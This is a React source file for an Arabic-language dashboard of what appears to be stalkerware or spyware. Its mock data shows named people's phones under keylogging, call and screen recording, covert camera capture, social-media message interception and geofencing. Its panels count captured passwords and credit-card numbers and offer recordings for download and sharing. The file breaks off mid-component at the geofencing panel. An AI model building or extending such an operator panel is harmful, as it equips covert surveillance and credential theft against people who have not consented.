import { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Input } from '@/components/ui/input'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { 
  Bell, 
  Search, 
  Settings, 
  User, 
  Smartphone, 
  Monitor, 
  Mic, 
  Camera, 
  MapPin, 
  FileText, 
  BarChart3, 
  Shield, 
  Wifi, 
  Battery, 
  Signal,
  Play,
  Download,
  Eye,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Clock,
  Activity,
  Users,
  Globe,
  Headphones,
  Video,
  Image,
  MessageSquare,
  Phone,
  Keyboard,
  Instagram,
  Facebook,
  Twitter,
  MapIcon,
  Zap,
  Target,
  TrendingUp,
  TrendingDown,
  Pause,
  Stop,
  RefreshCw,
  Filter,
  Calendar,
  Archive,
  Trash2,
  Share2,
  Lock,
  Unlock
} from 'lucide-react'
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, BarChart, Bar, PieChart, Pie, Cell, AreaChart, Area } from 'recharts'
import './App.css'

// API Configuration
const API_BASE_URL = 'http://localhost:5000/api'

// API Helper Functions
const apiCall = async (endpoint, method = 'GET', data = null) => {
  try {
    const options = {
      method,
      headers: {
        'Content-Type': 'application/json',
      },
    }
    
    if (data) {
      options.body = JSON.stringify(data)
    }
    
    const response = await fetch(`${API_BASE_URL}${endpoint}`, options)
    return await response.json()
  } catch (error) {
    console.error('API call failed:', error)
    return { success: false, error: error.message }
  }
}

// بيانات وهمية محدثة للعرض
const mockDevices = [
  {
    id: 1,
    name: "هاتف أحمد",
    type: "Android",
    status: "online",
    lastSeen: "منذ دقيقتين",
    battery: 85,
    location: "الرياض، السعودية",
    connection: "WiFi",
    advancedFeatures: {
      keylogger: { active: true, keystrokes: 1247, sensitiveData: 23 },
      callRecorder: { active: true, recordings: 45 },
      screenRecorder: { active: false, recordings: 12 },
      cameraCapture: { active: true, photos: 156 },
      socialMedia: { active: true, messages: 892 },
      geoFencing: { active: true, violations: 2 }
    }
  },
  {
    id: 2,
    name: "جهاز فاطمة",
    type: "iPhone",
    status: "offline",
    lastSeen: "منذ ساعة",
    battery: 45,
    location: "جدة، السعودية",
    connection: "4G",
    advancedFeatures: {
      keylogger: { active: false, keystrokes: 0, sensitiveData: 0 },
      callRecorder: { active: false, recordings: 0 },
      screenRecorder: { active: false, recordings: 0 },
      cameraCapture: { active: false, photos: 0 },
      socialMedia: { active: false, messages: 0 },
      geoFencing: { active: false, violations: 0 }
    }
  },
  {
    id: 3,
    name: "تابلت محمد",
    type: "iPad",
    status: "warning",
    lastSeen: "منذ 30 دقيقة",
    battery: 20,
    location: "الدمام، السعودية",
    connection: "WiFi",
    advancedFeatures: {
      keylogger: { active: true, keystrokes: 567, sensitiveData: 8 },
      callRecorder: { active: false, recordings: 0 },
      screenRecorder: { active: true, recordings: 5 },
      cameraCapture: { active: true, photos: 89 },
      socialMedia: { active: true, messages: 234 },
      geoFencing: { active: true, violations: 1 }
    }
  }
]

const mockRecordings = [
  {
    id: 1,
    type: "audio",
    name: "مكالمة_أحمد_2025-07-30_14-30.mp3",
    duration: "00:03:45",
    size: "2.1 MB",
    device: "هاتف أحمد",
    timestamp: "2025-07-30 14:30:15"
  },
  {
    id: 2,
    type: "screen",
    name: "شاشة_محمد_2025-07-30_13-15.mp4",
    duration: "00:01:23",
    size: "15.7 MB",
    device: "تابلت محمد",
    timestamp: "2025-07-30 13:15:42"
  },
  {
    id: 3,
    type: "image",
    name: "كاميرا_فاطمة_2025-07-30_12-00.jpg",
    duration: "-",
    size: "1.8 MB",
    device: "جهاز فاطمة",
    timestamp: "2025-07-30 12:00:33"
  }
]

// بيانات الرسوم البيانية
const weeklyActivityData = [
  { name: 'السبت', keystrokes: 1200, calls: 8, messages: 45, photos: 12 },
  { name: 'الأحد', keystrokes: 1800, calls: 12, messages: 67, photos: 18 },
  { name: 'الاثنين', keystrokes: 2100, calls: 15, messages: 89, photos: 25 },
  { name: 'الثلاثاء', keystrokes: 1950, calls: 11, messages: 76, photos: 22 },
  { name: 'الأربعاء', keystrokes: 2300, calls: 18, messages: 95, photos: 30 },
  { name: 'الخميس', keystrokes: 2050, calls: 14, messages: 82, photos: 27 },
  { name: 'الجمعة', keystrokes: 1600, calls: 9, messages: 58, photos: 15 }
]

const deviceTypeData = [
  { name: 'Android', value: 45, color: '#10B981' },
  { name: 'iPhone', value: 35, color: '#3B82F6' },
  { name: 'iPad', value: 20, color: '#8B5CF6' }
]

function App() {
  const [activeTab, setActiveTab] = useState('dashboard')
  const [devices, setDevices] = useState(mockDevices)
  const [recordings, setRecordings] = useState(mockRecordings)
  const [searchTerm, setSearchTerm] = useState('')
  const [notifications, setNotifications] = useState(3)

  // تحديث البيانات من الخادم
  useEffect(() => {
    const fetchData = async () => {
      try {
        // محاولة جلب البيانات من الخادم
        const devicesResponse = await apiCall('/devices')
        if (devicesResponse.success) {
          setDevices(devicesResponse.devices || mockDevices)
        }
        
        const recordingsResponse = await apiCall('/recordings')
        if (recordingsResponse.success) {
          setRecordings(recordingsResponse.recordings || mockRecordings)
        }
      } catch (error) {
        console.log('استخدام البيانات الوهمية:', error)
        // استخدام البيانات الوهمية في حالة فشل الاتصال
      }
    }

    fetchData()
    // تحديث البيانات كل 30 ثانية
    const interval = setInterval(fetchData, 30000)
    return () => clearInterval(interval)
  }, [])

  // تصفية الأجهزة حسب البحث
  const filteredDevices = devices.filter(device =>
    device.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    device.type.toLowerCase().includes(searchTerm.toLowerCase())
  )

  // حساب الإحصائيات المتقدمة
  const advancedStats = {
    totalKeystrokes: devices.reduce((sum, device) => sum + (device.advancedFeatures?.keylogger?.keystrokes || 0), 0),
    sensitiveData: devices.reduce((sum, device) => sum + (device.advancedFeatures?.keylogger?.sensitiveData || 0), 0),
    totalCallRecordings: devices.reduce((sum, device) => sum + (device.advancedFeatures?.callRecorder?.recordings || 0), 0),
    totalSocialMessages: devices.reduce((sum, device) => sum + (device.advancedFeatures?.socialMedia?.messages || 0), 0),
    totalPhotos: devices.reduce((sum, device) => sum + (device.advancedFeatures?.cameraCapture?.photos || 0), 0),
    geoViolations: devices.reduce((sum, device) => sum + (device.advancedFeatures?.geoFencing?.violations || 0), 0),
    activeAlerts: devices.filter(device => device.status === 'warning').length + 12
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white" dir="rtl">
      {/* Header */}
      <header className="bg-slate-800/50 backdrop-blur-sm border-b border-slate-700 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4 space-x-reverse">
              <Shield className="h-8 w-8 text-blue-400" />
              <h1 className="text-xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                لوحة التحكم المتقدمة
              </h1>
            </div>
            
            <div className="flex items-center space-x-4 space-x-reverse">
              <div className="relative">
                <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                <Input
                  type="text"
                  placeholder="البحث في الأجهزة..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 pr-10 bg-slate-700/50 border-slate-600 text-white placeholder-gray-400 w-64"
                />
              </div>
              
              <Button variant="ghost" size="sm" className="relative">
                <Bell className="h-5 w-5" />
                {notifications > 0 && (
                  <Badge className="absolute -top-1 -right-1 h-5 w-5 rounded-full bg-red-500 text-xs flex items-center justify-center">
                    {notifications}
                  </Badge>
                )}
              </Button>
              
              <Button variant="ghost" size="sm">
                <Settings className="h-5 w-5" />
              </Button>
              
              <Button variant="ghost" size="sm">
                <User className="h-5 w-5" />
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-5 bg-slate-800/50 border border-slate-700">
            <TabsTrigger value="dashboard" className="data-[state=active]:bg-blue-600">
              <BarChart3 className="h-4 w-4 ml-2" />
              الرئيسية
            </TabsTrigger>
            <TabsTrigger value="devices" className="data-[state=active]:bg-blue-600">
              <Smartphone className="h-4 w-4 ml-2" />
              الأجهزة
            </TabsTrigger>
            <TabsTrigger value="recordings" className="data-[state=active]:bg-blue-600">
              <Mic className="h-4 w-4 ml-2" />
              التسجيلات
            </TabsTrigger>
            <TabsTrigger value="advanced" className="data-[state=active]:bg-blue-600">
              <Zap className="h-4 w-4 ml-2" />
              الميزات المتقدمة
            </TabsTrigger>
            <TabsTrigger value="settings" className="data-[state=active]:bg-blue-600">
              <Settings className="h-4 w-4 ml-2" />
              الإعدادات
            </TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium text-gray-300">ضغطات المفاتيح</CardTitle>
                  <Keyboard className="h-4 w-4 text-blue-400" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-white">{advancedStats.totalKeystrokes.toLocaleString()}</div>
                  <p className="text-xs text-gray-400">
                    <span className="text-red-400">{advancedStats.sensitiveData}</span> بيانات حساسة
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium text-gray-300">تسجيلات المكالمات</CardTitle>
                  <Phone className="h-4 w-4 text-green-400" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-white">{advancedStats.totalCallRecordings}</div>
                  <p className="text-xs text-gray-400">
                    نشط على <span className="text-green-400">3</span> أجهزة
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium text-gray-300">الرسائل الاجتماعية</CardTitle>
                  <MessageSquare className="h-4 w-4 text-purple-400" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-white">{advancedStats.totalSocialMessages.toLocaleString()}</div>
                  <p className="text-xs text-gray-400">
                    من <span className="text-purple-400">6</span> تطبيقات
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium text-gray-300">انتهاكات جغرافية</CardTitle>
                  <MapPin className="h-4 w-4 text-red-400" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-white">{advancedStats.geoViolations}</div>
                  <p className="text-xs text-gray-400">
                    <span className="text-red-400">{advancedStats.activeAlerts}</span> تنبيه نشط
                  </p>
                </CardContent>
              </Card>
            </div>

            {/* Charts */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white">النشاط الأسبوعي</CardTitle>
                  <CardDescription className="text-gray-400">
                    إحصائيات الأنشطة المختلفة خلال الأسبوع
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <LineChart data={weeklyActivityData}>
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                      <XAxis 
                        dataKey="name" 
                        stroke="#9CA3AF"
                        style={{ fontSize: '12px' }}
                      />
                      <YAxis stroke="#9CA3AF" style={{ fontSize: '12px' }} />
                      <Tooltip 
                        contentStyle={{ 
                          backgroundColor: '#1F2937', 
                          border: '1px solid #374151',
                          borderRadius: '8px',
                          color: '#F9FAFB'
                        }} 
                      />
                      <Line type="monotone" dataKey="keystrokes" stroke="#3B82F6" strokeWidth={2} />
                      <Line type="monotone" dataKey="calls" stroke="#10B981" strokeWidth={2} />
                      <Line type="monotone" dataKey="messages" stroke="#8B5CF6" strokeWidth={2} />
                      <Line type="monotone" dataKey="photos" stroke="#F59E0B" strokeWidth={2} />
                    </LineChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white">توزيع أنواع الأجهزة</CardTitle>
                  <CardDescription className="text-gray-400">
                    النسبة المئوية لكل نوع جهاز
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <ResponsiveContainer width="100%" height={300}>
                    <PieChart>
                      <Pie
                        data={deviceTypeData}
                        cx="50%"
                        cy="50%"
                        labelLine={false}
                        label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                        outerRadius={80}
                        fill="#8884d8"
                        dataKey="value"
                      >
                        {deviceTypeData.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={entry.color} />
                        ))}
                      </Pie>
                      <Tooltip 
                        contentStyle={{ 
                          backgroundColor: '#1F2937', 
                          border: '1px solid #374151',
                          borderRadius: '8px',
                          color: '#F9FAFB'
                        }} 
                      />
                    </PieChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>
            </div>

            {/* Recent Activity */}
            <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-white">النشاط الأخير</CardTitle>
                <CardDescription className="text-gray-400">
                  آخر الأنشطة المسجلة على الأجهزة
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="flex items-center space-x-4 space-x-reverse">
                    <div className="w-2 h-2 bg-blue-400 rounded-full"></div>
                    <div className="flex-1">
                      <p className="text-sm text-white">تم تسجيل مكالمة جديدة</p>
                      <p className="text-xs text-gray-400">هاتف أحمد • منذ 5 دقائق</p>
                    </div>
                    <Badge variant="secondary" className="bg-blue-600/20 text-blue-400">
                      مكالمة
                    </Badge>
                  </div>
                  
                  <div className="flex items-center space-x-4 space-x-reverse">
                    <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                    <div className="flex-1">
                      <p className="text-sm text-white">تم التقاط صورة من الكاميرا</p>
                      <p className="text-xs text-gray-400">جهاز فاطمة • منذ 12 دقيقة</p>
                    </div>
                    <Badge variant="secondary" className="bg-green-600/20 text-green-400">
                      صورة
                    </Badge>
                  </div>
                  
                  <div className="flex items-center space-x-4 space-x-reverse">
                    <div className="w-2 h-2 bg-red-400 rounded-full"></div>
                    <div className="flex-1">
                      <p className="text-sm text-white">انتهاك منطقة جغرافية</p>
                      <p className="text-xs text-gray-400">تابلت محمد • منذ 18 دقيقة</p>
                    </div>
                    <Badge variant="secondary" className="bg-red-600/20 text-red-400">
                      تنبيه
                    </Badge>
                  </div>
                  
                  <div className="flex items-center space-x-4 space-x-reverse">
                    <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
                    <div className="flex-1">
                      <p className="text-sm text-white">رسائل جديدة من WhatsApp</p>
                      <p className="text-xs text-gray-400">هاتف أحمد • منذ 25 دقيقة</p>
                    </div>
                    <Badge variant="secondary" className="bg-purple-600/20 text-purple-400">
                      رسائل
                    </Badge>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Devices Tab */}
          <TabsContent value="devices" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {filteredDevices.map((device) => (
                <Card key={device.id} className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-white flex items-center">
                        <Smartphone className="h-5 w-5 ml-2" />
                        {device.name}
                      </CardTitle>
                      <Badge 
                        variant={device.status === 'online' ? 'default' : device.status === 'warning' ? 'destructive' : 'secondary'}
                        className={
                          device.status === 'online' ? 'bg-green-600/20 text-green-400' :
                          device.status === 'warning' ? 'bg-yellow-600/20 text-yellow-400' :
                          'bg-gray-600/20 text-gray-400'
                        }
                      >
                        {device.status === 'online' ? 'متصل' : device.status === 'warning' ? 'تحذير' : 'غير متصل'}
                      </Badge>
                    </div>
                    <CardDescription className="text-gray-400">
                      {device.type} • {device.lastSeen}
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <Battery className="h-4 w-4 text-green-400" />
                        <span className="text-sm text-gray-300">{device.battery}%</span>
                      </div>
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <Signal className="h-4 w-4 text-blue-400" />
                        <span className="text-sm text-gray-300">{device.connection}</span>
                      </div>
                    </div>
                    
                    <div className="flex items-center space-x-2 space-x-reverse">
                      <MapPin className="h-4 w-4 text-red-400" />
                      <span className="text-sm text-gray-300">{device.location}</span>
                    </div>

                    {/* Advanced Features Status */}
                    <div className="space-y-2">
                      <h4 className="text-sm font-medium text-white">الميزات المتقدمة:</h4>
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div className="flex items-center space-x-1 space-x-reverse">
                          <div className={`w-2 h-2 rounded-full ${device.advancedFeatures?.keylogger?.active ? 'bg-green-400' : 'bg-gray-400'}`}></div>
                          <span className="text-gray-300">Keylogger</span>
                        </div>
                        <div className="flex items-center space-x-1 space-x-reverse">
                          <div className={`w-2 h-2 rounded-full ${device.advancedFeatures?.callRecorder?.active ? 'bg-green-400' : 'bg-gray-400'}`}></div>
                          <span className="text-gray-300">المكالمات</span>
                        </div>
                        <div className="flex items-center space-x-1 space-x-reverse">
                          <div className={`w-2 h-2 rounded-full ${device.advancedFeatures?.socialMedia?.active ? 'bg-green-400' : 'bg-gray-400'}`}></div>
                          <span className="text-gray-300">اجتماعي</span>
                        </div>
                        <div className="flex items-center space-x-1 space-x-reverse">
                          <div className={`w-2 h-2 rounded-full ${device.advancedFeatures?.geoFencing?.active ? 'bg-green-400' : 'bg-gray-400'}`}></div>
                          <span className="text-gray-300">جغرافي</span>
                        </div>
                      </div>
                    </div>
                    
                    <div className="flex space-x-2 space-x-reverse">
                      <Button size="sm" variant="outline" className="flex-1 border-slate-600 text-white hover:bg-slate-700">
                        <Eye className="h-4 w-4 ml-1" />
                        عرض
                      </Button>
                      <Button size="sm" variant="outline" className="flex-1 border-slate-600 text-white hover:bg-slate-700">
                        <Settings className="h-4 w-4 ml-1" />
                        تحكم
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Recordings Tab */}
          <TabsContent value="recordings" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm text-white flex items-center">
                    <Headphones className="h-4 w-4 ml-2 text-blue-400" />
                    التسجيلات الصوتية
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  {recordings.filter(r => r.type === 'audio').map((recording) => (
                    <div key={recording.id} className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-300 truncate">{recording.name}</span>
                        <Badge variant="secondary" className="bg-blue-600/20 text-blue-400 text-xs">
                          {recording.duration}
                        </Badge>
                      </div>
                      
                      {/* Audio Player */}
                      <div className="bg-slate-700/50 rounded-lg p-3 space-y-2">
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <Button size="sm" variant="ghost" className="h-8 w-8 p-0">
                            <Play className="h-4 w-4" />
                          </Button>
                          <div className="flex-1 bg-slate-600 rounded-full h-1">
                            <div className="bg-blue-400 h-1 rounded-full w-1/3"></div>
                          </div>
                          <span className="text-xs text-gray-400">01:15</span>
                        </div>
                        
                        {/* Audio Waveform */}
                        <div className="flex items-end justify-center space-x-1 space-x-reverse h-8">
                          {[...Array(20)].map((_, i) => (
                            <div 
                              key={i} 
                              className="bg-blue-400 rounded-full w-1"
                              style={{ height: `${Math.random() * 100 + 20}%` }}
                            ></div>
                          ))}
                        </div>
                      </div>
                      
                      <div className="flex items-center justify-between text-xs text-gray-400">
                        <span>{recording.device}</span>
                        <span>{recording.size}</span>
                      </div>
                      
                      <div className="flex space-x-1 space-x-reverse">
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Download className="h-3 w-3 ml-1" />
                          تحميل
                        </Button>
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Share2 className="h-3 w-3 ml-1" />
                          مشاركة
                        </Button>
                      </div>
                    </div>
                  ))}
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm text-white flex items-center">
                    <Video className="h-4 w-4 ml-2 text-green-400" />
                    تسجيلات الشاشة
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  {recordings.filter(r => r.type === 'screen').map((recording) => (
                    <div key={recording.id} className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-300 truncate">{recording.name}</span>
                        <Badge variant="secondary" className="bg-green-600/20 text-green-400 text-xs">
                          {recording.duration}
                        </Badge>
                      </div>
                      
                      {/* Video Thumbnail */}
                      <div className="bg-slate-700/50 rounded-lg aspect-video flex items-center justify-center">
                        <Play className="h-8 w-8 text-white" />
                      </div>
                      
                      <div className="flex items-center justify-between text-xs text-gray-400">
                        <span>{recording.device}</span>
                        <span>{recording.size}</span>
                      </div>
                      
                      <div className="flex space-x-1 space-x-reverse">
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Download className="h-3 w-3 ml-1" />
                          تحميل
                        </Button>
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Share2 className="h-3 w-3 ml-1" />
                          مشاركة
                        </Button>
                      </div>
                    </div>
                  ))}
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm text-white flex items-center">
                    <Image className="h-4 w-4 ml-2 text-purple-400" />
                    الصور
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  {recordings.filter(r => r.type === 'image').map((recording) => (
                    <div key={recording.id} className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-300 truncate">{recording.name}</span>
                        <Badge variant="secondary" className="bg-purple-600/20 text-purple-400 text-xs">
                          صورة
                        </Badge>
                      </div>
                      
                      {/* Image Thumbnail */}
                      <div className="bg-slate-700/50 rounded-lg aspect-square flex items-center justify-center">
                        <Image className="h-8 w-8 text-white" />
                      </div>
                      
                      <div className="flex items-center justify-between text-xs text-gray-400">
                        <span>{recording.device}</span>
                        <span>{recording.size}</span>
                      </div>
                      
                      <div className="flex space-x-1 space-x-reverse">
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Download className="h-3 w-3 ml-1" />
                          تحميل
                        </Button>
                        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs">
                          <Share2 className="h-3 w-3 ml-1" />
                          مشاركة
                        </Button>
                      </div>
                    </div>
                  ))}
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm text-white flex items-center">
                    <MessageSquare className="h-4 w-4 ml-2 text-yellow-400" />
                    الرسائل
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-gray-300">رسائل WhatsApp</span>
                      <Badge variant="secondary" className="bg-green-600/20 text-green-400 text-xs">
                        45 رسالة
                      </Badge>
                    </div>
                    <div className="bg-slate-700/50 rounded-lg p-2">
                      <p className="text-xs text-gray-300">آخر رسالة: "سأصل خلال 10 دقائق"</p>
                      <p className="text-xs text-gray-400 mt-1">منذ 5 دقائق</p>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-gray-300">رسائل Telegram</span>
                      <Badge variant="secondary" className="bg-blue-600/20 text-blue-400 text-xs">
                        23 رسالة
                      </Badge>
                    </div>
                    <div className="bg-slate-700/50 rounded-lg p-2">
                      <p className="text-xs text-gray-300">آخر رسالة: "تم إرسال الملف"</p>
                      <p className="text-xs text-gray-400 mt-1">منذ 12 دقيقة</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Advanced Features Tab */}
          <TabsContent value="advanced" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {/* Keylogger Panel */}
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <Keyboard className="h-5 w-5 ml-2 text-blue-400" />
                    مراقب المفاتيح
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    مراقبة ضغطات المفاتيح والبيانات الحساسة
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-blue-400">{advancedStats.totalKeystrokes.toLocaleString()}</div>
                      <div className="text-xs text-gray-400">إجمالي الضغطات</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-red-400">{advancedStats.sensitiveData}</div>
                      <div className="text-xs text-gray-400">بيانات حساسة</div>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">كلمات مرور</span>
                      <span className="text-red-400">12</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">أرقام بطاقات</span>
                      <span className="text-red-400">3</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">إيميلات</span>
                      <span className="text-yellow-400">8</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-blue-600 hover:bg-blue-700">
                    <Eye className="h-4 w-4 ml-2" />
                    عرض التفاصيل
                  </Button>
                </CardContent>
              </Card>

              {/* Social Media Panel */}
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <MessageSquare className="h-5 w-5 ml-2 text-purple-400" />
                    التطبيقات الاجتماعية
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    مراقبة الرسائل والأنشطة الاجتماعية
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="text-center">
                    <div className="text-2xl font-bold text-purple-400">{advancedStats.totalSocialMessages.toLocaleString()}</div>
                    <div className="text-xs text-gray-400">إجمالي الرسائل</div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">WhatsApp</span>
                      </div>
                      <span className="text-green-400">456</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-blue-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">Telegram</span>
                      </div>
                      <span className="text-blue-400">234</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-pink-500 rounded-full"></div>
                        <span className="text-sm text-gray-300">Instagram</span>
                      </div>
                      <span className="text-pink-400">123</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="w-3 h-3 bg-blue-600 rounded-full"></div>
                        <span className="text-sm text-gray-300">Facebook</span>
                      </div>
                      <span className="text-blue-600">79</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-purple-600 hover:bg-purple-700">
                    <MessageSquare className="h-4 w-4 ml-2" />
                    عرض الرسائل
                  </Button>
                </CardContent>
              </Card>

              {/* Call Recorder Panel */}
              <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-white flex items-center">
                    <Phone className="h-5 w-5 ml-2 text-green-400" />
                    مسجل المكالمات
                  </CardTitle>
                  <CardDescription className="text-gray-400">
                    تسجيل ومراقبة المكالمات الصوتية
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-green-400">{advancedStats.totalCallRecordings}</div>
                      <div className="text-xs text-gray-400">تسجيلات</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-blue-400">3</div>
                      <div className="text-xs text-gray-400">أجهزة نشطة</div>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">مكالمات واردة</span>
                      <span className="text-green-400">28</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">مكالمات صادرة</span>
                      <span className="text-blue-400">17</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-300">إجمالي المدة</span>
                      <span className="text-yellow-400">2:45:30</span>
                    </div>
                  </div>
                  
                  <Button className="w-full bg-green-600 hover:bg-green-700">
                    <Headphones className="h-4 w-4 ml-2" />
                    استماع للتسجيلات
                  </Button>
                </CardContent>
              </Card>

              {/* Geo-Fencing Panel */}
